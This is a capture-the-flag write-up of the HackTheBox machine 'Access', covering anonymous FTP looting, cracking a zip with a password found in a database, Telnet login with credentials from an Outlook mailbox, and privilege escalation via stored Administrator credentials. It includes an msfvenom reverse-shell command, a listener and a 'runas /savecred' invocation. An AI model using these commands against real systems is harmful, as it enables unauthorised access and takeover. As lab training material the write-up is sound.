---
created: 2025-08-30
---

📅 `2025-08-30`

#ftp #database #stored-credentials

----

## 🖥️ Box Info

| ️🏷️ Name         |  `Access`   |
| --------------- | --- |
| 📆 Release Date |   `2018-09-29`  |
| 🌐 IP Address   |  `10.10.10.98`   |
| 🖥️ OS           |  `Windows`   |
| 🎯 Difficulty   |  `Easy`   |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- `FTP` anonymous access
- Access database
- Password-protected `.zip` file
- `cmdkey /list`

**🛠️ Tools:**  

- `MS` Access

----

## 🌐 Port Scan

- **TCP**: 21, 23, 80
- **UDP**: None

---

## 🔍 Enumeration

I enumerated the web server first. I found this site:

![[Pasted image 20250829194506.png]]

It wasn't very promising. The source code had nothing, and `steghide`, `binwalk3`, and `exiftool` found nothing in the picture. Fuzzing for directories and for subdomains (`FUZZ.access.htb`) also came up empty, so I concluded it was a rabbit hole and moved on to the other services.

I decided to enumerate port 21 next (`FTP`), which had anonymous login enabled. It had these folders:

```
ftp> ls
425 Cannot open data connection.
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
```

I looked through it for anything interesting.

```
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
```

Found `backup.mdb`, which is an `MS` Access database. I switched to binary mode to download it.

```
ftp> binary
ftp> get backup.mdb
```

Now let's enumerate the other directory and download whatever it has.

```
ftp> cd ..
ftp> cd Engineer
ftp> ls
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> get "Access Control.zip"
```

That's everything in the `FTP` share.

---

## 🪜 Foothold / User

Next, I tried to unzip the `.zip` file.

```shell
$ unzip Access\ Control.zip
Archive:  Access Control.zip
   skipping: Access Control.pst      unsupported compression method 99
```

`unzip` doesn't support this compression method, but `7z` does.

```shell
$ 7z x Access\ Control.zip
<SNIP>
Enter password (will not be echoed):
```

It asks for a password.

Remember we also had a database. I found this in it:

![[Pasted image 20250829221603.png]]

`auth_user` was one of the only populated tables.

I finally extracted the `.zip` file with the password `access4u@security`, which we found in the database.

```shell
$ 7z x Access\ Control.zip
<SNIP>
Enter password (will not be echoed):
Everything is Ok
```

This file was extracted:

```shell
$ ls
 'Access Control.pst'
<SNIP>
```

`Access Control.pst` is an Outlook data file, which stores emails. It can be imported into the `Evolution` mail client, so let's do that.

And look at what we found:

![[Pasted image 20250829221810.png]]

![[Pasted image 20250829221817.png]]

Let's try these credentials on the `Telnet` port.

Credentials:

- `security`:`4Cc3ssC0ntr0ller`


```shell
$ telnet 10.10.10.98 23
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security> whoami
access\security

C:\Users\security> cd Desktop

C:\Users\security\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\security\Desktop

08/28/2018  07:51 AM    <DIR>          .
08/28/2018  07:51 AM    <DIR>          ..
08/29/2025  06:53 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,287,465,984 bytes free
```

Got user.

---

## 🛡️ Privilege Escalation

I started enumerating the system and found this in the root directory:

```
C:\Userssecuritydir C:\
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\

08/23/2018  11:05 PM    <DIR>          inetpub
07/14/2009  04:20 AM    <DIR>          PerfLogs
08/23/2018  09:53 PM    <DIR>          Program Files
08/24/2018  08:40 PM    <DIR>          Program Files (x86)
08/31/2025  01:54 AM    <DIR>          temp
08/21/2018  11:31 PM    <DIR>          Users
07/14/2021  02:04 PM    <DIR>          Windows
08/22/2018  08:23 AM    <DIR>          ZKTeco
               0 File(s)              0 bytes
               8 Dir(s)   3,279,736,832 bytes free
```

The `ZKTeco` folder looks interesting. It has `ZKAccess` installed, which has a [privilege escalation vulnerability](https://www.exploit-db.com/exploits/40323). I tried to exploit it, but it was another rabbit hole.

I also tried downloading files from the `ZKAccess` directory to look for credentials. I used `impacket-smbserver` and `move <file> \\10.10.14.11\share`, but I didn't have permissions on the files.

I then decided to do a simple `cmdkey /list` and found this:

```
c:\ZKTeco\ZKAccess3.5>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

The `Administrator` credentials are stored, so we can run commands as `Administrator` with `runas /savecred`. I created a reverse shell `.exe`:

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=1234 -f exe -o rev.exe
```

I transferred `rev.exe` to `C:\Temp\` with `certutil` and started a listener:

```shell
penelope -p 1234
```

And run the reverse shell:

```shell
runas /savecred /user:Administrator C:\temp\rev.exe
```

```shell
C:\Windows\system32>whoami
whoami
access\administrator

C:\Windows\system32>cd C:\Users\Administrator
cd C:\Users\Administrator

C:\Users\Administrator> cd Desktop

C:\Users\Administrator\Desktop> dir
Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\Administrator\Desktop

07/14/2021  03:40 PM    <DIR>          .
07/14/2021  03:40 PM    <DIR>          ..
08/29/2025  06:53 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,279,736,832 bytes free
```

Rooted.
